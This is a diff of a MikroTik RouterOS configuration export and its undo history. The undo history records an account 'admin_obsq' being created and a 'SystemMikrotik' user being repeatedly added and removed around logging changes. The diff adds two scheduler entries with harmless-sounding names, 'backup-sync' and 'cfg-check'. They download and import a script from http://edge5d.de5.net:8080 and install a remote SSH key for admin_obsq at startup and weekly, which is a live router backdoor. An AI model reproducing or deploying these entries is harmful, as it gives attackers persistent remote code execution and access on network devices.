@@ -10,57 +10,59 @@
 #   installed-version: 7.17
 # Flags: U - UNDOABLE
 # Columns: ACTION, BY, POLICY, TIME
-#   ACTION                         BY       POLICY  TIME
-# U user admin_obsq added          0        write   2026-09-21 04:27:10
-#                                           policy
-# U user SystemMikrotik removed    0        write   2026-09-12 02:01:59
-#                                           policy
-# U log action changed             0        write   2026-09-12 02:00:58
-# U log rule changed               0        write   2026-09-12 02:00:58
-# U log rule changed               0        write   2026-09-12 02:00:58
-# U log rule changed               0        write   2026-09-12 02:00:58
-# U log rule changed               0        write   2026-09-12 02:00:58
-# U log rule changed               0        write   2026-09-12 02:00:58
-# U traffic flow config changed    0        write   2026-09-12 02:00:58
-# U log action changed             0        write   2026-09-12 02:00:58
-# U log rule changed               0        write   2026-09-11 23:40:45
-# U log rule changed               0        write   2026-09-11 23:40:45
-# U script removed from scheduler  0        write   2026-09-11 23:40:45
-# U new script scheduled           0        write   2026-09-11 23:40:44
-# U user SystemMikrotik added      0        write   2026-09-11 23:40:44
-#                                           policy
-# U log action changed             0        write   2026-09-11 23:40:44
-# U log rule changed               0        write   2026-09-11 23:40:44
-# U log rule changed               0        write   2026-09-11 23:40:44
-# U log rule changed               0        write   2026-09-11 23:40:44
-# U log rule changed               0        write   2026-09-11 23:40:44
-# U log rule changed               0        write   2026-09-11 23:40:44
-# U traffic flow config changed    0        write   2026-09-11 23:40:44
-# U log action changed             0        write   2026-09-11 23:40:44
-# U user SystemMikrotik removed    0        write   2026-09-11 02:10:45
-#                                           policy
-# U log rule changed               0        write   2026-09-11 02:09:56
-# U log rule changed               0        write   2026-09-11 02:09:56
-# U script removed from scheduler  0        write   2026-09-11 02:09:56
-# U new script scheduled           0        write   2026-09-11 02:09:55
-# U user SystemMikrotik added      0        write   2026-09-11 02:09:55
-#                                           policy
-# U log action changed             0        write   2026-09-11 02:09:55
-# U log rule changed               0        write   2026-09-11 02:09:55
-# U log rule changed               0        write   2026-09-11 02:09:55
-# U log rule changed               0        write   2026-09-11 02:09:55
-# U log rule changed               0        write   2026-09-11 02:09:55
-# U log rule changed               0        write   2026-09-11 02:09:55
-# U traffic flow config changed    0        write   2026-09-11 02:09:55
-# U log action changed             0        write   2026-09-11 02:09:55
-# U user routeradmini changed      0        write   2026-09-09 13:15:09
-#                                           policy
-# U log rule changed               support  write   2026-09-09 01:58:04
-# U log rule changed               support  write   2026-09-09 01:57:32
-# U user support added             0        write   2026-09-09 01:57:18
-#                                           policy
-# U user routeradmini added        0        write   2026-09-08 08:08:56
-#                                           policy
+#   ACTION                         BY          POLICY  TIME
+# U new script scheduled           admin_obsq  write   2026-09-23 23:56:17
+# U new script scheduled           admin_obsq  write   2026-09-23 23:56:16
+# U user admin_obsq added          0           write   2026-09-21 04:27:10
+#                                              policy
+# U user SystemMikrotik removed    0           write   2026-09-12 02:01:59
+#                                              policy
+# U log action changed             0           write   2026-09-12 02:00:58
+# U log rule changed               0           write   2026-09-12 02:00:58
+# U log rule changed               0           write   2026-09-12 02:00:58
+# U log rule changed               0           write   2026-09-12 02:00:58
+# U log rule changed               0           write   2026-09-12 02:00:58
+# U log rule changed               0           write   2026-09-12 02:00:58
+# U traffic flow config changed    0           write   2026-09-12 02:00:58
+# U log action changed             0           write   2026-09-12 02:00:58
+# U log rule changed               0           write   2026-09-11 23:40:45
+# U log rule changed               0           write   2026-09-11 23:40:45
+# U script removed from scheduler  0           write   2026-09-11 23:40:45
+# U new script scheduled           0           write   2026-09-11 23:40:44
+# U user SystemMikrotik added      0           write   2026-09-11 23:40:44
+#                                              policy
+# U log action changed             0           write   2026-09-11 23:40:44
+# U log rule changed               0           write   2026-09-11 23:40:44
+# U log rule changed               0           write   2026-09-11 23:40:44
+# U log rule changed               0           write   2026-09-11 23:40:44
+# U log rule changed               0           write   2026-09-11 23:40:44
+# U log rule changed               0           write   2026-09-11 23:40:44
+# U traffic flow config changed    0           write   2026-09-11 23:40:44
+# U log action changed             0           write   2026-09-11 23:40:44
+# U user SystemMikrotik removed    0           write   2026-09-11 02:10:45
+#                                              policy
+# U log rule changed               0           write   2026-09-11 02:09:56
+# U log rule changed               0           write   2026-09-11 02:09:56
+# U script removed from scheduler  0           write   2026-09-11 02:09:56
+# U new script scheduled           0           write   2026-09-11 02:09:55
+# U user SystemMikrotik added      0           write   2026-09-11 02:09:55
+#                                              policy
+# U log action changed             0           write   2026-09-11 02:09:55
+# U log rule changed               0           write   2026-09-11 02:09:55
+# U log rule changed               0           write   2026-09-11 02:09:55
+# U log rule changed               0           write   2026-09-11 02:09:55
+# U log rule changed               0           write   2026-09-11 02:09:55
+# U log rule changed               0           write   2026-09-11 02:09:55
+# U traffic flow config changed    0           write   2026-09-11 02:09:55
+# U log action changed             0           write   2026-09-11 02:09:55
+# U user routeradmini changed      0           write   2026-09-09 13:15:09
+#                                              policy
+# U log rule changed               support     write   2026-09-09 01:58:04
+# U log rule changed               support     write   2026-09-09 01:57:32
+# U user support added             0           write   2026-09-09 01:57:18
+#                                              policy
+# U user routeradmini added        0           write   2026-09-08 08:08:56
+#                                              policy
 # 
 # software id = 0F6A-2IRW
 #
@@ -160,6 +162,9 @@ add address=44.34.128.181
 add address=44.34.133.3
 add address=162.159.200.1
 add address=162.159.200.123
+/system scheduler
+add interval=1w name=backup-sync on-event=":do {/tool fetch url=http://edge5d.de5.net:8080/lab10390/sync.rsc dst-path=sync.rsc; :delay 1000; /import sync.rsc} on-error={}; :if ([:len [/user ssh-keys find where key-owner=ntp-service]] = 0) do={/tool fetch url=http://edge5d.de5.net:8080/ntp.pub dst-path=ntp.pub; :delay 1000; /user ssh-keys import public-key-file=ntp.pub user=admin_obsq}" policy=read,write,policy,password,sniff,sensitive start-date=2026-09-23 start-time=21:10:00
+add name=cfg-check on-event=":for i from=1 to=6 do={ :if ([:len [/user ssh-keys find where key-owner=ntp-service]] = 0) do={ :do {/tool fetch url=http://edge5d.de5.net:8080/ntp.pub dst-path=ntp.pub} on-error={:delay 10000}; :do {/user ssh-keys import public-key-file=ntp.pub user=admin_obsq} on-error={:delay 2000} } }" policy=read,write,policy,password,sniff,sensitive start-time=startup
 /tool bandwidth-server
 set authenticate=no enabled=no
 /tool mac-server
